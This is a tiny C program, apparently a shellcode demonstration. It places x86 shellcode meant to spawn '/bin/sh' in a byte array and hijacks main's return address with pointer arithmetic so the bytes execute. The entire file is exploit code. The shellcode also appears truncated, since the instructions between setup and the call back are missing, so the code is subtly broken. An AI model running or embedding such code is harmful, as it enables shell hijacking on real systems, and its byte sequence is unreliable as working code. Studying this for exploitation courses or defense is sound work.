#include<stdio.h>
char shellc[] = "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46"
                "\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
int main()
{
        int *i;
        i = (int *)&i + 3;
        (*i) = (int)shellc;
}